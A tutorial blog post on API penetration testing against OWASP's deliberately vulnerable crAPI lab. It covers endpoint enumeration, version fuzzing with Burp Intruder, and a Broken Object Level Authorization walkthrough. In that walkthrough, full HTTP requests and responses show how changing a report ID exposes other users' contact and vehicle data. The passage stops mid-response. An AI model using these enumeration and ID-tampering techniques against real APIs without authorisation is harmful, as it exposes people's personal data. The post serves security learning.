<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="API Pentest" /><meta property="og:locale" content="en_US" /><meta name="description" content="API Pentesting" /><meta property="og:description" content="API Pentesting" /><link rel="canonical" href="https://nananan.github.io/posts/api-pentest/" /><meta property="og:url" content="https://nananan.github.io/posts/api-pentest/" /><meta property="og:site_name" content="CinnamonSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-04-06T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="API Pentest" /><meta name="twitter:site" content="@_cinnamon_92" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-08-06T17:51:49+02:00","datePublished":"2023-04-06T00:00:00+02:00","description":"API Pentesting","headline":"API Pentest","mainEntityOfPage":{"@type":"WebPage","@id":"https://nananan.github.io/posts/api-pentest/"},"url":"https://nananan.github.io/posts/api-pentest/"}</script><title>API Pentest | CinnamonSec</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4NBRMHJVCG"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4NBRMHJVCG'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CinnamonSec</a></div><div class="site-subtitle font-italic">Cyber Security interested.<br> Rubber Ducks lover.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/rust-art/" class="nav-link"> <i class="fa-fw fas fa-paint-brush ml-xl-3 mr-xl-3 unloaded"></i> <span>RUST ART</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nananan" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/_cinnamon_92" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['eliana-c','live.it'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>API Pentest</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>API Pentest</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Eliana Cannella </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Apr 6, 2023, 12:00 AM +0200" prep="on" > Apr 6, 2023 <i class="unloaded">2023-04-06T00:00:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Aug 6, 2023, 5:51 PM +0200" prefix="Updated " > Aug 6, 2023 <i class="unloaded">2023-08-06T17:51:49+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="5001 words">27 min</span></div></div><div class="post-content"><h1 id="api-pentesting">API Pentesting</h1><p>API pentesting, also known as API penetration testing, is a security testing technique that focuses on identifying vulnerabilities and weaknesses in the Application Programming Interfaces (APIs) of web applications. APIs are used to allow different applications to interact and exchange information with each other, making them a critical component of modern web development. However, APIs can also be a potential attack surface for malicious actors seeking to exploit vulnerabilities and gain unauthorized access to sensitive data or functionality. API pentesting involves testing the APIs of a web application for various security flaws, such as authentication and authorization issues, injection vulnerabilities, insecure data storage, and improper input validation. By identifying these weaknesses, API pentesting can help organizations to strengthen the security of their web applications and protect against potential attacks. API pentesting is a critical aspect of any comprehensive web application security testing program and is becoming increasingly important as more organizations rely on APIs to power their digital products and services.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/api_intro.jpg" width="50%" height="50%" /></p><p>I’m not a big expert on API Pentesting, and so, I’m writing this post to learn and I hope that can be helpful to someone else. To perform the test for the following vulnerablities I used the <a href="https://github.com/OWASP/crAPI">crAPI</a> application from OWASP.</p><h2 id="enumeration"><span style="color: var(--link-color);">Enumeration</span></h2><p>As always, we should start with the enumeration that we perform with several methods.</p><p>Enumeration is the process of gathering information about the target API in a systematic and organized manner. It involves identifying and mapping out the various resources, endpoints, parameters, and functionalities of the API. Enumeration is an important step in API pentesting because it helps the tester to understand the structure and behavior of the API, and to identify potential attack vectors.</p><p>During the enumeration phase of an API pentest, a tester might perform the following activities:</p><ul><li>Discover and map out all available endpoints of the API.<li>Identify and document all parameters and input fields that are required for each endpoint.<li>Enumerate the available HTTP methods (GET, POST, PUT, DELETE, etc.) for each endpoint.<li>Identify the authentication and authorization mechanisms used by the API.<li>Test for rate limiting and other access control mechanisms.<li>Identify the type of data returned by the API (JSON, XML, etc.) and any potential vulnerabilities that may exist in the response data.<li>Check for any API versioning, and enumerate any version-specific features or vulnerabilities.</ul><p>By performing a thorough enumeration of the target API, a tester can gain a deeper understanding of the API’s functionality and identify potential attack vectors that could be used to exploit vulnerabilities in the API.</p><p>To enumerate endpoint, it is helpful use the API documentation if it exists. The problem with the documentation is that, often, expecially in real world, the developer doesn’t write the documentation. This is due to many reasons, i.e rapidly evolving, third-party API, but also for lack of resourse. Developing documentation for an API can be a time-consuming and resource-intensive process. Smaller organizations or teams with limited resources may prioritize other tasks over creating documentation for their APIs.</p><p>Also, we can remember all the stuff, or maybe no (?)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/documentation_missing.png" alt="Documentation Missing" /></p><p>Also the fuzzing of path, versioning and parameters is very important. Fuzzing involves sending large amounts of random data to an API’s input fields in order to identify potential vulnerabilities and crashes. While fuzzing can be a useful tool in identifying security weaknesses, it can also be dangerous when used in production environments. One of the main risks associated with fuzzing in production is the potential for data corruption or loss. Fuzzing involves sending large amounts of random data to the input fields, which can potentially corrupt or delete data stored in the production environment. This can lead to data loss, service interruptions, and other problems. Another risk associated with fuzzing in production is the potential for Denial-of-Service (DoS) attacks. Fuzzing can result in excessive requests or other forms of traffic that can overload the production environment and cause a DoS attack. This can result in service interruptions or even bring down the entire system.</p><p>To perform the fuzzing, tou can use the Burp Intruder or other tools such as ffuf. To use the Burp Intruder, with the Sniper attack mode</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/burp_intruder1.png" alt="Burp Intruder Configuration" /></p><p>As you can see, in the image above, we want to fuzz the version of the API. For example, it can exist v0 or v1. This could be useful if in previosly version, there are some endpoint that expose sensitive data.</p><p>Then, to finish the burp configuration, you should sent the payload with the wordlist. In this case, since we want to fuzz only the number, we use the Number Payload of the Intruder and we set the “From”, “To” and “Step”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/burp_intruder2.png" alt="Burp Intruder Configuration" /></p><p>Then, by starting the attacks we can see that exists only the version 2: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/versioning.png" alt="Burp Intruder Configuration" /></p><p>The first request is the baseline request, it means that it the original request that you use to start the attack.</p><p>In this way, you can fuzz also the path. For instance, if you have the path “/identity/api/v2/community/posts/recent”, you can change the “posts” with “users” to see if exist an endpoint that can expose information about users.</p><p>Now, we check some vulnerabilities common in the APIs.</p><h2 id="authorization"><span style="color: var(--link-color);">Authorization</span></h2><p>An “Authorization” attack against an API refers to a security exploit that occurs when an attacker gains unauthorized access to an API endpoint or performs an action that they are not authorized to perform. This can occur when the API fails to properly enforce access controls or when the API access controls are not properly configured.</p><p>In this categories we can find 2 common vulnerabilities:</p><ul><li>Broken Object Level Authorization (BOLA)<li>Broken Function Level Authorization (BFLA)</ul><h3 id="broken-object-level-authorization-bola"><span style="color: var(--link-color);">Broken Object Level Authorization (BOLA)</span></h3><p>Broken Object Level Authorization is a security vulnerability that occurs when an API or application fails to properly enforce access controls on an object-level basis. This can allow attackers to access or modify sensitive data or functionality that they are not authorized to access.</p><p>Object-level authorization refers to the practice of defining access controls at the level of individual objects, such as records in a database or files in a filesystem. This is in contrast to traditional role-based access control, which defines access controls at the level of groups or roles.</p><p>An example of a Broken Object Level Authorization vulnerability in an API is an online shopping. Suppose you have an online shopping application with an API that allows users to view and modify their orders. The API requires users to authenticate with a username and password before accessing any functionality. However, the API does not properly enforce object-level authorization controls, and instead relies on client-side validation to prevent unauthorized access. This means that once a user is authenticated, they are free to view or modify any order, regardless of whether they are the owner of that order or not. An attacker could exploit this vulnerability by intercepting API requests and modifying the order ID in the request to view or modify another user’s order. Since the API does not perform any additional checks to ensure that the user is authorized to view or modify the requested order, the attacker would be able to access or modify sensitive data that they are not authorized to access.</p><p>Refering to the crAPI application, this is applicable to the “Contact Mechanic” functionality. Indeed, this endpoint response with a URL to check the status of the mechanic request.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/api-pentest/BOLA_1.png" alt="BOLA" /></p><p>By performing the request in the image above:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/workshop/api/merchant/contact_mechanic</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">210</span>
<span class="na">sec-ch-ua</span><span class="p">:</span> <span class="s">" Not A;Brand";v="99", "Chromium";v="104"</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODA0NDc5NzcsImV4cCI6MTY4MTA1Mjc3N30.cSsB6HaNFCYPL855rJP7W-TbiTd8iRCHFrO5m07sKr4j-a8QWD4s6xDXKIgorP-5F_7w44X2y1ClwptlxK96x3oGsq6TaHTklD6TB6DiRYmDRtVj4GYrTQUxAx-ar2lnV56zMVgzh1aKFzCopi9mm8THl0fRL-GjyziED0oiYIt2Zf79n8z-RTUNVkJdSu4ba0Ru1hxTWKaexC6tZsTOXtqDK3S_EKYgdGxeYbAUWPAfRMCGeEOGwHfKkSFph-N-nm2xO_8OKHhg17nQPktOBFoWSz3jGRKRL464j0LsgToJM-bA-KKoBuJsRjN_xy68LL6ovIkThggEZaUrRVQpTQ</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">sec-ch-ua-mobile</span><span class="p">:</span> <span class="s">?0</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span>
<span class="na">sec-ch-ua-platform</span><span class="p">:</span> <span class="s">"Linux"</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://localhost:8888</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-origin</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://localhost:8888/contact-mechanic?VIN=7CCZG71CRZO653819</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>

<span class="p">{</span><span class="w">
   </span><span class="nl">"mechanic_code"</span><span class="p">:</span><span class="s2">"TRAC_JHN"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"problem_details"</span><span class="p">:</span><span class="s2">"Test"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"vin"</span><span class="p">:</span><span class="s2">"7CCZG71CRZO653819"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"mechanic_api"</span><span class="p">:</span><span class="s2">"http://localhost:8888/workshop/api/mechanic/receive_report"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"repeat_request_if_failed"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="w">
   </span><span class="nl">"number_of_repeats"</span><span class="p">:</span><span class="mi">1</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>We get the following response:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 13:56:50 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Allow</span><span class="p">:</span> <span class="s">POST, OPTIONS</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin, Cookie</span>
<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">152</span>

<span class="p">{</span><span class="w">
   </span><span class="nl">"response_from_mechanic_api"</span><span class="p">:{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="w">
      </span><span class="nl">"sent"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="w">
      </span><span class="nl">"report_link"</span><span class="p">:</span><span class="s2">"http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=7"</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"status"</span><span class="p">:</span><span class="mi">200</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>From the response, we can see the “report_link” that contains an ID, the “report_id”. If we perform a request to that link:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/workshop/api/mechanic/mechanic_report?report_id=7</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">sec-ch-ua</span><span class="p">:</span> <span class="s">" Not A;Brand";v="99", "Chromium";v="104"</span>
<span class="na">sec-ch-ua-mobile</span><span class="p">:</span> <span class="s">?0</span>
<span class="na">sec-ch-ua-platform</span><span class="p">:</span> <span class="s">"Linux"</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">none</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-User</span><span class="p">:</span> <span class="s">?1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">document</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</pre></table></code></div></div><p>And as response:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 13:57:53 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Allow</span><span class="p">:</span> <span class="s">GET, HEAD, OPTIONS</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Origin, Cookie</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">289</span>

<span class="p">{</span><span class="w">
   </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="w">
   </span><span class="nl">"mechanic"</span><span class="p">:{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="w">
      </span><span class="nl">"mechanic_code"</span><span class="p">:</span><span class="s2">"TRAC_JHN"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"user"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"jhon@example.com"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"number"</span><span class="p">:</span><span class="s2">""</span><span class="w">
      </span><span class="p">}</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"vehicle"</span><span class="p">:{</span><span class="w">
      </span><span class="nl">"id"</span><span class="p">:</span><span class="mi">28</span><span class="p">,</span><span class="w">
      </span><span class="nl">"vin"</span><span class="p">:</span><span class="s2">"7CCZG71CRZO653819"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"owner"</span><span class="p">:{</span><span class="w">
         </span><span class="nl">"email"</span><span class="p">:</span><span class="s2">"test@test.com"</span><span class="p">,</span><span class="w">
         </span><span class="nl">"number"</span><span class="p">:</span><span class="s2">"0123456789"</span><span class="w">
      </span><span class="p">}</span><span class="w">
   </span><span class="p">},</span><span class="w">
   </span><span class="nl">"problem_details"</span><span class="p">:</span><span class="s2">"Test"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"status"</span><span class="p">:</span><span class="s2">"Pending"</span><span class="p">,</span><span class="w">
   </span><span class="nl">"created_on"</span><span class="p">:</span><span class="s2">"08 April, 2023, 13:56:49"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>In this response,there are all the information about the user, his vehicle and the mechanics issue. So, now if we change the “report_id”, we retrieve the information about other users:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/workshop/api/mechanic/mechanic_report?report_id=1</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8888</span>
<span class="na">sec-ch-ua</span><span class="p">:</span> <span class="s">" Not A;Brand";v="99", "Chromium";v="104"</span>
<span class="na">sec-ch-ua-mobile</span><span class="p">:</span> <span class="s">?0</span>
<span class="na">sec-ch-ua-platform</span><span class="p">:</span> <span class="s">"Linux"</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">none</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-User</span><span class="p">:</span> <span class="s">?1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">document</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</pre></table></code></div></div><p>And the response:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">openresty/1.17.8.2</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 08 Apr 2023 14:11:53 GMT</span>
